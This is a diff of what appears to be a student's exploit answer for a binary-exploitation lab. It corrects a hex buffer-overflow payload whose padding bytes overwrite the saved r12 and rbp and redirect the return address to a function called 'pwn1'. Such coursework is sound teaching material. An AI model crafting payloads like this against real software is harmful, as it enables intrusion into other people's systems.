@@ -1,13 +1,12 @@
 Q. Your exploit explanation below.
 
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36
-36 36 36 36 36 36 36 - padding to fill buffer
-36 36 36 36 36 36 36 - fill to fill saved 32 on stack
-36 39 36 36 36 36 36 - padding to fill saved rbp on stack
-36 36 c3 19 40 00 00 00 - address to pwn1 + alignment padding 
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36
+36 36 36 36 36 36 36 36 - padding to fill buffer
+36 36 36 36 36 36 36 36 - fill to fill saved r12 on stack
+36 39 36 36 36 36 36 36 - padding to fill saved rbp on stack
+c3 19 40 00 00 00 00 00 - address to pwn1
